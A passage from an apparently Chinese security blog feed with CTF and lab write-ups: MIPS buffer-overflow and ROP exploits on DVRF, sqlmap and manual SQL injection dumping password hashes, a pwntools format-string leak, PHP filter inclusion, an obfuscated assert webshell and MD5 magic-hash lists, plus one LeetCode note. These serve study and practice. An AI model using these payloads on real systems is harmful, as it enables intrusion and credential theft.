30 characters ok![+] output to patternShell.txt ok![+] take time: 0.0004 s 动态调试： ./qemu-mipsel-static -g 1234 ./stack01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9 直接在调用函数返回的地方下断点，查看此时的$ra寄存器的值 12345.text:00400450 move $sp, $fp.text:00400454 lw $ra, 0x38+var_4($sp).text:00400458 lw $fp, 0x38+var_8($sp).text:0040045C addiu $sp, 0x38.text:00400460 jr $ra (断点) 计算需要padding的长度 12345&gt; python patternOffset.py -s 0x62413961 -l 30[*] Create pattern string contains 30 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 28 (adjusted another-endian)[+] take time: 0.0008 s 需要填充28个字节 最后的payload ./qemu-mipsel-static -g 1234 ./stack01 `python -c &quot;print 'a'*28+'\x90\x03\x40\x00'&quot;` 此时成功地发生了跳转 12345root@ubuntu:~/stack# ./qemu-mipsel-static ./stack01 `python -c &quot;print &apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# lscore qemu-mipsel-static stack01 stack01.id0 stack01.idb stack01.tilqemu-mipsel ret2txt.c stack01.c stack01.id1 stack01.nam# whoamiroot ROP chain 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; 此处main函数明显是非叶子函数，我们要想办法调用do_system_0这个函数 那就要想办法控制$a1寄存器，那样就可以执行任何命令 mipsrop.stackfinder() 查找gadget 我们选择 0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) 要做到跳转到我们的gadget，需要覆盖main函数的返回地址 先计算要padding的长度 此时计算出来的pattern是412，会不会太长了点(注：在我参考的文章中作者计算出来的偏移和我的不一样，刚开始我以为是自己计算错了，但是后来调试后认为自己并没有算错) 接下来我尝试先覆盖main函数的返回地址 跳转到rop的空间，再将/bin/sh字符串的地址赋值给$a1 $ra被覆盖 f7单步一次，跳转到gadget 而且此时栈空间已经布置好了 addiu $a1, $sp, 0x58+var_40相当于 $a1 = $sp+0x18 此时$sp+0x18存放的就是/bin/sh字符串的地址 然而不知道为什么 这个错误就很不明不白了 重新回顾了一下《揭秘家用路由器0day漏洞挖掘技术》，看到了作者写的一个exp 将gadget的地址替换成我的，如下： 12345678910111213141516171819202122import structcmd = &quot;sh&quot;cmd += &quot;\x00&quot;*(4-len(cmd)%4)shellcode = &quot;A&quot;*0x19cshellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadget地址，作者写的是&quot;&lt;L&quot;但是我尝试之后发现地址是反的，所以换过来了shellcode+=&quot;A&quot;*24shellcode+=cmdshellcode+=&quot;B&quot;*(0x3C-len(cmd))shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0函数地址shellcode+=&quot;BBBB&quot;print &quot;ok&quot;print &quot;[+] create password file&quot;fw = open(&apos;passwd&apos;, &apos;w&apos;)fw.write(shellcode)fw.close()print &apos;ok&apos; 生成passwd文件之后，./qemu-mipsel-static -g 1234 ./vuln_system进行调试 当程序跳转到gadget时，变成了这样， 此时看终端： 我居然成功了？？此时已经拿到了root权限 确实没有看错，重新运行一遍程序，确实拿到了shell权限 DVRF 练习 这个在attifyOS上已经下载好了，当然也可以去GitHub上clone一份，一个很不错的项目 来看Intro的stack_bof_01 程序位于/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/ 源码位于/home/oit/DVRF/Pwnable Source/Intro 1234567891011121314151617181920212223242526272829303132#include &lt;string.h&gt;#include &lt;stdio.h&gt;//Simple BoF by b1ack0wl for E1550int main(int argc, char **argv[])&#123;char buf[200] =&quot;\0&quot;;if (argc &lt; 2)&#123;printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);exit(1);&#125;printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);strcpy(buf, argv[1]);printf(&quot;You entered %s \r\n&quot;, buf);printf(&quot;Try Again\r\n&quot;);return 0x41; // Just so you can see what register is populated for return statements&#125;void dat_shell()&#123;printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);system(&quot;/bin/sh -c&quot;);//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);//execve(&quot;/bin/sh&quot;, 0, 0);exit(0);&#125; 显然也是strcpy函数没有限制拷贝的长度 运行它： 123root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01Usage: stack_bof_01 &lt;argument&gt;-By b1ack0wl 我们直接计算偏移地址 生成长度为200的字符串 123456/home/oit [oit@ubuntu] [5:50]&gt; python patternOffset.py -s 0x41386741 -l 200[*] Create pattern string contains 200 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 204 (adjusted another-endian)[+] take time: 0.0042 s 那我们试一试直接填充 12root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; testroot@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot; 此时已经将$ra寄存器的值覆盖掉了 但是 在dat_shell函数中 报错了 所以这时候需要借助gadget 之前参考了几篇文章，都是通过查找libc的基地址来确认gadget在内存中的地址的，但是我开始要gdb调试的时候并没有看到libc.so.0的加载，所以我一直怀疑是不是没加载，然后然后，看到原程序中是有puts和memset这些函数的，那显然是加载了的 于是下一个断点然后调试 终于找到了libc的加载基址 这样就好办了 python -c &quot;print 'a'*204+'\x20\x1b\x8a\x40'+'\x50\x09\x40\x00'&quot; &gt; test 之后运行 ok已经成功了！！！ 1234567root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;Welcome to the first BoF exercise!You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa �@P @Try AgainCongrats! I will now execute /bin/sh- b1ack0wl 不过为啥用mipsrop找不到这个gadget呢？ 很疑惑 确认libc基址的方法大概有： vmmap cat /proc/pid/maps查看进程的内存分布 在IDA中查找到函数真正加载的位置，然后计算偏移 参考 路由器漏洞挖掘之栈溢出入门（一）(感觉这篇文章中第二个程序调试的不是很正确，因为偏移计算的都不一样) 路由器漏洞挖掘之栈溢出入门（二）]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[两道sql注入题]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式 可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &quot;post.txt&quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &quot;url&quot; --forms 指定参数 趁机学到了一把sqlmap使用 虽然这个题目是有点。。 但是注入点的判断也是很重要的 爆后端数据库 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; 爆数据库 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs 指定数据库报表爆表 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables 指定数据库和表爆字段 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns 指定数据库，表，字符然后dump出数据 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump ![member](https://i.imgur.com/iRvoAHX. 123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ 解密之后是106370 这样就能登陆后台了 太神奇了 参考 sqlmap之(六)----POST登陆框注入实战 SQL手工注入漏洞测试(Access数据库) 这道题目就有点神奇了 纯靠猜 order by 4判断有多少个字段 然后 new_list.asp?id=1 and exists(select * from admin)判断是否存在admin 接下来判断回显位置 /new_list.asp?id=1 union select 1,2,3,4 from admin 接下来猜测字段值 and exists (select id from admin) 爆出字段值 union select 1,username,passwd,id from admin md5解密一下登陆就行了 参考]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[错解 怎么快速地将链表倒置 😕 最后还是因为溢出的问题 思路： 12345678910111213141516171819202122​ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; 就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等 将得到的结果在转化为链表 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //先取一个头节点ListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; 记录一下将整数转为string的操作 Integer.toString(result) Math.pow函数的返回值必须是double类型的 但是这样会面临一个问题，也就是最开图片的那个，溢出！ 正解 看了眼答案，才明白自己从开始就想错了 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; 最关键的就是 ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== 其实只需要从低位开始一位位的加上去就好了。 然后再把它们给链起来]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串分析]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[格式化字符串 这个题目是ctfwiki上的 c代码如下： 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; （突然发现腾讯文档居然还支持代码好强啊 我们编译一下： 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g 把保护措施都关掉了 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 先看一下几个payload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. 在printf处下断点 此时栈上的布局如下 12345600:0000│ esp 0xffffcf9c —▸ 0x80484ea (main+100) ◂— add esp, 0x2001:0004│ 0xffffcfa0 —▸ 0x8048593 ◂— and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008│ 0xffffcfa4 ◂— 0x103:000c│ 0xffffcfa8 ◂— 0x22222222 ('""""')04:0010│ 0xffffcfac ◂— 0xffffffff05:0014│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x' continue一下： 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c 输出了信息的同时， 命中第二个断点 此时栈上的布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x'... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%08x.%08x.%08x'06:0018│ 0xffffcfc4 ◂— '.%08x.%08x'07:001c│ 0xffffcfc8 ◂— 'x.%08x' 此时printf函数会把格式化字符串之后的栈上的信息当作参数打印出来： contiue一下 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] 之前栈上的信息显示的不全，栈的内存如下： 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 是格式化字符串的地址， 我们看到此时printf函数将0xffffcfc0 0xf7fcf410 0x0804849d 都打印出来了， 也就是格式化字符串之后的三个位置的信息 我们通过这种方式泄露栈的信息，但是也可以直接去取得栈中被视为第n+1个参数的值 至于为什么是第n+1, 这是因为格式化字符串是第一个参数 比如 通过 %3$x(这个的原理是啥？为什么要加$符号) 我们可以泄露栈上被视为第4个参数的值 栈布局如下：(左边的一列是栈地址，也就是内存的地址，箭头代表了这个内存单元存储的数据，如果是指针还会进一步指示) 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%3$x'... ↓(这里是省略号，是不是就是直接指向了，中间那个就被跳过了)03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%3$x'06:0018│ 0xffffcfc4 ◂— 0x007:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 同样看不清， 还是直接打印内存信息吧(x命令的用法，这里显示的是内存地址从0xffffcfb0开始的，因为内存是按照字节编址的，所以一行正好是16个字节内存地址就是加10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0这个内存单元指向了0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (看内存单元0xffffcfc0存放的内容就是x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 猜猜这时候打印的信息是啥？ 答案是栈上被视为第四个参数的信息： 0x0804849d 同样的我们还可以通过%s来得到字符串的信息 栈布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— 0x7325 /* '%s' */... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— 0x7325 /* '%s' */06:0018│ 0xffffcfc4 ◂— 0x107:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 还是看不清，直接看内存吧(md 垃圾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 这个时候会直接将 0xffffcfc0 对应的字符串打印出来 结果自然就是 %s了 如果我们输入%2$s, 这个时候就很有趣了， 按照道理程序会将 0xf7fcf410 对应地址的当作字符串打印出来， 可是如果这个地址无效呢？ 我自己尝试的结果是直接退出了，什么都没有打印出来emm 这时候如果我们指定一个合法的地址， 比如got表中某个函数的地址这就很神奇了 exp如下： 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #这两个payload是自己测试的payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() 我们运行这个exp 在pwndbg中下断点 运行到第二个printf的时候 123456789───────────────────────────────────[ STACK ]────────────────────────────────────00:0000│ esp 0xffa3bdfc —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffa3be00 —▸ 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp... ↓03:000c│ 0xffa3be08 —▸ 0xf7f85410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffa3be0c —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffa3be10 —▸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) —▸ 0xf7df2bb0 (__isoc99_scanf) ◂— push ebp06:0018│ 0xffa3be14 ◂— '%4$s'07:001c│ 0xffa3be18 —▸ 0xf7fb3900 (catch_hook) ◂— 0x0 另一边 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a │····│%4$s│·│ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 │0000│0001│.222│2222│ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 │2.ff│ffff│ff.·│···%│ 00000020 34 24 73 0a │4$s·││ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 │····│·+··││ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive 这个时候我们就得到了scanf函数的地址了 ok 还有几个地方没弄明白之后再写 确定可控制格式化字符串位置的方法 既然程序是有漏洞的，我们就必须知道可被控制的格式化字符串的位置，这时候大致有以下几种姿势 构造类似 [tag]%p%p%p%p%p%p...这样的参数 Pwngdb中有一个叫做fmarg可以用来获取指定地址到底是第几个参数 不是很理解第一种方法原理，但是第二种方法比较好用 不过我们可以来看一个例子： IDA中的C代码： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; 显然的格式化字符串漏洞 我们需要在printf函数处下断点 然后随便输入一些数字: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. 这时候可以看到flag了，注意我们是在本地调试，调试的时候当然可以看到flag，一般的pwn题都是要远程连接的 如果我们要泄露flag的值，就需要构造%n$s这样的传进去。所以获取参数的位置很关键 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") 通过Pwngdb就可以查看参数的位置了 这时候运行 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;���But that was totally wrong lol get rekt 就得到了flag (这里值得注意的就是，64位系统和32位系统传参是不一样的)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku web题目的wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
    <content type="text"><![CDATA[welcome to bugkuctf ctrl + U查看页面源代码， 如果有 $user且 file_get_contents($user, 'r') 的 值是 指定的字符串。 就会 include $file 的内容 。 并且提示是 hint.php这个文件 这里涉及到一个怎么把 get 方法传入的参数作为一个文件打开。 php伪协议 这里用到了 php://input 但是。。 这就要用到第二个伪协议： php://filter 我那样传递参数会报错， include($file) 只是把 $file 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。 这就是一个泄露了源码的漏洞了。 最后构造的URL如下： http://123.206.87.240:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 惊叹。 base64 解密之后的源代码。 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 代码里面构造了一个类。 公有变量是 $file 继续看一下 index.php 的源代码 123456789101112131415161718192021222324252627282930313233&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; &lt;!-- $user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; --&gt; 有几个地方暂时写不到位， 先到这里好了。 过狗一句话 很蒙 1234&lt;?php $poc="a#s#s#e#r#t";$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 上面是题目提示的过狗一句话代码。 然后...后面的不会了 字符，正则？ 前女友 一道很有趣的题目， 就不说题目了， 直接放我的测试代码 123456789101112131415161718192021&lt;?phperror_reporting(0);if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; echo "$v1&lt;/br&gt;"; var_dump($v1); echo "&lt;/br&gt;"; echo md5($v1)."&lt;/br&gt;"; echo "$v2&lt;/br&gt;"; echo md5($v2)."&lt;/br&gt;"; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; echo "true"; &#125; else &#123; echo "false"; &#125;&#125;?&gt; 也是第一次发现get还能传递数组（不过当然是一堆的错误） MD5 collision 还不太清楚MD5 碰撞是啥， 以后补坑 payload 120.24.86.145:9009/md5.php?a=s878926199a 常用的MD5碰撞 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 秋名山老司机 123456789101112&lt;head&gt;&lt;title&gt;下面的表达式的值是秋名山的车速&lt;/title&gt;&lt;meta 